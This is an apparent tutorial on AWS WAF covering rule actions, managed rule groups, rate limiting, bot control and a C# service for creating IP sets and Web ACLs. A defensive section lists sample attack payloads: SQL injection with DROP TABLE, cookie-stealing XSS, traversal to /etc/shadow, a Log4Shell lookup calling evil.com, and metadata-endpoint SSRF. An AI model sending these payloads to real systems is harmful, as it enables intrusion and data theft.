🛡️ What is AWS WAF?

WAF = Web Application Firewall. A managed AWS security service that inspects HTTP(S) requests before they reach your application. It filters out malicious traffic — SQL injection, XSS, bot attacks, DDoS — before any damage is done.

💡 Real-life analogy

WAF is like a bouncer at a nightclub. Every person (HTTP request) that tries to enter is checked at the door. The bouncer checks ID (auth headers), looks for weapons (malicious payloads), checks the banned list (IP blocklist), and counts how many times someone has knocked (rate limiting). Troublemakers are turned away before they get inside.

💀 Internet — Mixed Traffic
  • Real users making legitimate requests

↓
All traffic hits WAF first

  • Inspects every HTTP request: headers, URI, body, IP, cookies
  • Evaluates against your rules in priority order

  • Runs in milliseconds — no noticeable latency impact

⚙️ How WAF Works — Inside the Inspection Engine

Full Request Inspection Flow

📨 Incoming HTTP Request
  • POST /api/login HTTP/1.1
  • Host: api.myapp.com
  • User-Agent: Mozilla/5.0...
  • Body: username=admin&password=' OR 1=1--
  • Client IP: 192.168.1.1 | Country: RU
↓
🔍 WAF inspects all parts of the request
  • IP address + country
  • URI path and query string
  • HTTP headers (User-Agent, Referer, etc.)
  • Request body (up to 8 KB by default, 64 KB with extended)
  • Cookies and session tokens
↓
📋 Rules evaluated in PRIORITY ORDER
  • Priority 1: AWSManagedRulesAmazonIpReputationList → IP not on blacklist ✓
  • Priority 2: AWSManagedRulesCommonRuleSet → body matches SQLi pattern! 🚨
  • Rule action: BLOCK → stop evaluating, return 403
  • Remaining rules never evaluated (first match wins)
↓
🚫 BLOCKED — 403 Returned
  • Custom error page shown
  • Attack logged to S3
  • CloudWatch metric +1
  • Backend never called
✅ ALLOWED — forwarded
  • Passes all rules
  • Request reaches ALB
  • Normal response to client
  • Still logged to S3

The 4 Rule Actions

🚫 BLOCK

Request rejected immediately. Returns HTTP 403 (or your custom error page). Backend never invoked. The most common action for confirmed threats.

✅ ALLOW

Request passes immediately — skip all remaining rules. Use for trusted IPs (office IP, monitoring service) that should bypass all other checks.

📊 COUNT

Request continues processing (not blocked). Increments a counter. Use during testing to see how many requests would have been blocked without actually blocking them. Essential before enabling new rules.

🧩 CHALLENGE / CAPTCHA

Presents a CAPTCHA puzzle to the client. Distinguishes humans from bots. The request is held until the challenge is solved. Use for suspicious-but-not-confirmed traffic.

Web ACL — The Container for Your Rules

📁 Web ACL (Web Access Control List)
  • The top-level WAF resource — one per protected endpoint
  • Contains a list of rules in priority order
  • Has a default action: ALLOW or BLOCK (what happens if no rule matches)
  • Can be associated with multiple resources (e.g. one ACL for all your ALBs)
  • Scope: REGIONAL (ALB, API GW) or CLOUDFRONT (global)
  • WCU limit: 1,500 WCU per Web ACL (rules consume different amounts)

💡 Default action matters

Set default action to ALLOW when you know what to block (block bad, allow rest). Set it to BLOCK when you know who to allow (allowlist approach — block everything by default, only allow specific IPs/paths). Most public APIs use ALLOW as default with blocking rules.

📋 Rules & Rule Groups

Rules are the individual checks WAF applies to each request. Rule Groups bundle related rules together. A Web ACL contains both individual rules and rule groups.

Rule Types

🔍 Match-based Rules

  • IP Set: Match specific IPs or CIDR ranges
  • Geo Match: Match by country code
  • String Match: Contains, starts with, ends with, regex
  • Size Constraint: Body/header too large?
  • SQLi Detection: Built-in SQL injection detector
  • XSS Detection: Built-in cross-site scripting detector

📊 Rate-based Rules

  • Count requests from same IP over time window
  • Configurable: 100 – 2,000,000,000 per 5 minutes
  • Aggregate by: IP, forwarded IP, HTTP method, header
  • Scope-down: only count on specific paths (e.g. /login)
  • Action when limit hit: BLOCK, COUNT, or CHALLENGE

AWS Managed Rule Groups — Ready to use

🟠 Common Rule Set

OWASP Top 10 — SQLi, XSS, path traversal, log4shell. Use on every API.

🔵 IP Reputation

AWS threat intel — botnets, Tor exits, known bad actors. Enable by default.

🟢 Known Bad Inputs

Exploits like Log4JRCE, SSRF, XXE. Enable alongside Common Rule Set.

🔵 Bot Control

Detect bad bots, crawlers, scrapers. Signature + browser verification.

🔴 Account Takeover

Detect credential stuffing on login endpoints. Checks for leaked passwords.

🟠 Account Creation Fraud

Detect fake account signups — protects registration endpoints.

🔵 SQL Database

Deep SQL injection for backend-specific patterns. Supplement Common set.

🟢 Linux/POSIX OS

Linux command injection, shell exploits. Use if app runs on Linux (most do).

Logical Operators in Rules

🔗 AND / OR / NOT Statements

Combine multiple conditions in one rule:

AND example: Block if path starts with /admin AND IP is NOT in office IP set
OR example: Block if body contains SQLi OR XSS pattern
NOT example: Block if User-Agent does NOT contain "Mozilla" (non-browser)

Use logical operators to avoid false positives — e.g. allow your own scanner while blocking others.

🎯 Threat Protection — Attack by Attack

How WAF detects and blocks each category of attack, with real examples of what the malicious payloads look like.

SQL Injection — Detection Flow

💀 Attacker sends SQLi payload
  • POST /api/login
  • Body: username=admin&password=' OR '1'='1
  • Goal: bypass authentication and log in as any user
↓
🛡️ WAF SQLi detector activates
  • Decodes URL-encoded characters
  • Detects SQL keywords: OR, UNION, SELECT, DROP, INSERT
  • Identifies comment sequences: --, /*, xp_
  • Pattern matched in request body
↓
🚫 Request BLOCKED — 403 returned
  • Attack logged: client IP, timestamp, matched rule, payload sample
  • Database never receives the malicious query
  • CloudWatch metric: SQLi_Count +1

Common Attack Payloads WAF Blocks

💉 SQL Injection

  • ' OR 1=1--
  • UNION SELECT * FROM users
  • '; DROP TABLE orders--
  • 1' AND SLEEP(5)--

📜 Cross-Site Scripting

  • <script>alert(1)</script>
  • javascript:void(0)
  • onerror=alert(document.cookie)
  • <img src=x onerror=...>

📁 Path Traversal

  • ../../../etc/passwd
  • ..%2F..%2Fetc%2Fshadow
  • ....//....//etc/hosts

🔥 Log4Shell / RCE

  • ${jndi:ldap://evil.com/x}
  • ${${::-j}${::-n}di:...}
  • Obfuscated JNDI lookup patterns

🌐 SSRF

  • http://169.254.169.254/
  • http://[::ffff:a9fe:a9fe]/
  • AWS metadata endpoint access

🤖 Bad Bot Signatures

  • User-Agent: sqlmap/1.0
  • User-Agent: Nikto/2.1.6
  • User-Agent: curl/7.0 (scanning)
  • No User-Agent header at all

Geo Blocking — Country-Level Control

🌍 Request from blocked country
  • IP: 195.x.x.x (Russia)
  • WAF geo match: RU → BLOCK
  • Returns 403 immediately
  • Backend never sees request
✅ Request from allowed country
  • IP: 106.x.x.x (India)
  • Geo match: IN → not blocked
  • Continues to next rules
  • Processed normally

⚠️ Geo blocking caveats

VPNs and proxies can bypass geo blocks — treat as one layer, not a complete solution. Also: your own developers or users may be traveling in blocked countries. Build an allowlist (your office IPs) with ALLOW action at higher priority to override geo blocks for known-good traffic.

🚦 Rate Limiting & Bot Control

Rate limiting stops floods and brute force attacks. Bot Control identifies and manages automated traffic — both good bots (Googlebot) and bad bots (scrapers, credential stuffers).

Rate Limiting — How It Works

💀 Attacker — Credential Stuffing
  • 1,000 POST /api/login requests in 5 minutes
  • All from same IP: 45.33.32.156
  • Trying 1,000 stolen username/password combos
↓
🛡️ WAF Rate-based Rule: LoginRateLimit
  • Scope-down: only count POST requests to /api/login
  • Aggregate by: IP address
  • Threshold: 100 requests per 5 minutes per IP
  • After request #101 from this IP → BLOCK triggered
↓
🚫 All requests from that IP now BLOCKED
  • Block lasts until rate drops below threshold
  • Other IPs unaffected — only this attacker blocked
  • Real users can still log in normally
  • Block automatically lifted when window expires

Rate Limit Configuration Options

⏱ Time Window

  • 1 minute — ultra-sensitive
  • 2 minutes
  • 5 minutes — most common
  • 10 minutes
  • 30 minutes

🔑 Aggregate By

  • Source IP (most common)
  • Forwarded IP (behind proxy/CDN)
  • HTTP Method
  • Query argument value
  • Header value (e.g. API key)

Bot Control — Separating Good from Bad

🤖 Automated Request Arrives
  • User-Agent: Googlebot/2.1
  • User-Agent: scrapy/2.5
  • User-Agent: python-requests/2.28
  • No User-Agent (headless browser)
↓
🛡️ Bot Control — categorisation
  • Checks AWS managed bot signature database (1000s of bots)
  • Verifies Googlebot IP matches Google's published IP ranges
  • Browser fingerprint check: is JS running? Canvas fingerprint?
  • Challenge suspicious bots with CAPTCHA
↓
✅ Good Bot — Allowed
  • Verified Googlebot
  • BingBot, DuckDuckBot
  • Your monitoring bots
  • Allowlisted crawlers
🚫 Bad Bot — Blocked
  • scrapy, curl scanners
  • Credential stuffers
  • Price scrapers
  • Unverified crawlers

Bot Control Tiers

📋 Common Bot Control (Cheaper)

  • Signature-based detection
  • Known bot patterns database
  • Verifies common crawlers (Google, Bing)
  • $0.10 per million requests inspected
  • Good for: most APIs

🧠 Targeted Bot Control (Advanced)

  • Browser fingerprinting
  • JavaScript challenge
  • Detects headless browsers
  • $1.00 per million + fees
  • Good for: e-commerce, ticketing

WAF Service — Create Rules, IP Sets, Web ACL

WafService.cs 
using Amazon.WAFV2;
using Amazon.WAFV2.Model;

public class WafService
{
    private readonly IAmazonWAFV2 _waf;
    private const Scope WafScope = Scope.REGIONAL;

    public WafService(IAmazonWAFV2 waf) => _waf = waf;

    // ── Create IP Set ──────────────────────────────
    public async Task<string> CreateIpSetAsync(
        string name, List<string> cidrs)
    {
        var response = await _waf.CreateIPSetAsync(
            new CreateIPSetRequest
        {
            Name             = name,
            Scope            = WafScope,
            IPAddressVersion = IPAddressVersion.IPV4,
            Addresses        = cidrs,
            // e.g. ["203.0.113.0/24", "198.51.100.1/32"]
            Description      = "Office and VPN IPs — bypass WAF rules"
        });
        return response.Summary.ARN;
    }

    // ── Add IP to existing IP Set ──────────────────
    public async Task AddIpToSetAsync(
        string ipSetId, string ipSetName, string newCidr)
    {
        // Must get current IPs + lock token first
        var current = await _waf.GetIPSetAsync(
            new GetIPSetRequest
        {
            Id    = ipSetId,
            Name  = ipSetName,
            Scope = WafScope
        });

        var updatedAddresses = new List<string>(
            current.IPSet.Addresses) { newCidr };

        await _waf.UpdateIPSetAsync(new UpdateIPSetRequest
        {
            Id        = ipSetId,
            Name      = ipSetName,
            Scope     = WafScope,
            Addresses = updatedAddresses,
            LockToken = current.LockToken // required!
        });
    }

    // ── Create Web ACL with managed rules ─────────
    public async Task<string> CreateWebAclAsync(
        string name, string officeIpSetArn)
    {
        var response = await _waf.CreateWebACLAsync(
            new CreateWebACLRequest
        {
            Name          = name,
            Scope         = WafScope,
            DefaultAction = new DefaultAction
            {
                Allow = new AllowAction() // default: allow all
            },
            Rules = new List<Rule>
            {
                // Rule 1: Allow office IPs (priority 1)
                new Rule
                {
                    Name     = "AllowOfficeIPs",
                    Priority = 1,
                    Action   = new RuleAction
                        { Allow = new AllowAction() },
                    Statement = new Statement
                    {
                        IPSetReferenceStatement =
                            new IPSetReferenceStatement
                            { ARN = officeIpSetArn }
                    },
                    VisibilityConfig = new VisibilityConfig
                    {
                        SampledRequestsEnabled   = true,
                        CloudWatchMetricsEnabled = true,
                        MetricName               = "AllowOfficeIPs"
                    }
                },
                // Rule 2: AWS Managed Common Rule Set (priority 100)
                new Rule
                {
                    Name     = "AWSManagedCommonRuleSet",
                    Priority = 100,
                    // No Action for managed groups
                    OverrideAction = new OverrideAction
                        { None = new NoneAction() },
                    Statement = new Statement
                    {
                        ManagedRuleGroupStatement =
                            new ManagedRuleGroupStatement
                        {
                            VendorName = "AWS",
                            Name       = "AWSManagedRulesCommonRuleSet"
                        }
                    },
                    VisibilityConfig = new VisibilityConfig
                    {
                        SampledRequestsEnabled   = true,
                        CloudWatchMetricsEnabled = true,
                        MetricName               = "CommonRuleSet"
                    }
                }
            },
            VisibilityConfig = new VisibilityConfig
            {
                SampledRequestsEnabled   = true,
                CloudWatchMetricsEnabled = true,
                MetricName               = name
            }
        });
        return response.Summary.ARN;
    }

    // ── Associate Web ACL with ALB ─────────────────
    public async Task AssociateWithAlbAsync(
        string webAclArn, string albArn)
    {
        await _waf.AssociateWebACLAsync(
            new AssociateWebACLRequest
        {
            WebACLArn   = webAclArn,
            ResourceArn = albArn
        });
    }

    // ── Get sampled requests (see what was blocked) ─
    public async Task<List<SampledHTTPRequest>>
        GetSampledRequestsAsync(string webAclArn, string ruleName)
    {
        var response = await _waf.GetSampledRequestsAsync(
            new GetSampledRequestsRequest
        {
            WebAclArn    = webAclArn,
            RuleMetricName = ruleName,
            Scope        = WafScope,
            MaxItems     = 100,
            TimeWindow   = new TimeWindow
            {
                StartTime = DateTime.UtcNow.AddHours(-1),
                EndTime   = DateTime.UtcNow
            }
        });
        return response.SampledRequests;
    }
}

✅ Best Practices & Common Mistakes

Getting Started Right

  • Always start new rules in COUNT mode — monitor for 1–2 weeks before switching to BLOCK
  • Enable the 3 core AWS managed rule groups on every public API: IP Reputation + Common + Known Bad Inputs
  • Create an ALLOW rule for your office/VPN IPs at priority 1 — never accidentally block yourself
  • Set default action to ALLOW for public APIs — block only known bad traffic
  • Enable logging to S3 from day one — you need the history when attacks happen
  • Test WAF with a safe SQLi payload after setup: ?test=' OR '1'='1

Rules & Rule Groups

  • Use scope-down on rate-based rules — protect /login specifically, not all routes
  • Set rate limit thresholds based on real usage data — not guesses
  • Use IP sets for allowlists/blocklists — easier to update than inline rules
  • Add labels to custom rules — use in downstream rules for complex logic
  • Keep rule priorities documented — gaps between priorities (10, 20, 30) for future insertions
  • Review WCU consumption — stay under 1,500 per Web ACL

Monitoring & Response

  • Set CloudWatch alarms on BlockedRequests spikes — get alerted on attacks
  • Use Athena on S3 WAF logs to query attack patterns at scale
  • Review sampled requests weekly — look for false positives in your rules
  • Keep a runbook: what to do when WAF blocks legitimate traffic
  • Test geo blocks with a VPN monthly — ensure rules still apply correctly
  • Use Shield Advanced alongside WAF for DDoS protection SLA (for critical apps)

Cost Control

  • WAF pricing: $5/month per Web ACL + $1/month per rule + $0.60 per million requests
  • Log only BLOCK actions in prod to avoid paying for millions of allow logs
  • Use one Web ACL per environment — don't create unnecessary ACLs
  • Bot Control adds cost — only enable if you have bot traffic problems
  • Use Kinesis Firehose → S3 (not CloudWatch) for logs — cheaper at volume

Common Mistakes to Avoid

⚠️ Top WAF Mistakes

❌ Enabling rules in BLOCK mode immediately — false positives break legitimate users
❌ No office IP allowlist — you block yourself when testing new rules
❌ Attaching WAF to HTTP API Gateway — not supported, use CloudFront instead
❌ No logging enabled — you have no visibility during an attack
❌ Rate limit too low — legitimate bursts (mobile app launch) get blocked
❌ Rate limit too high — doesn't actually protect against brute force
❌ Trusting WAF alone — still validate input in your application code
❌ Ignoring false positives — blocked legitimate users never come back
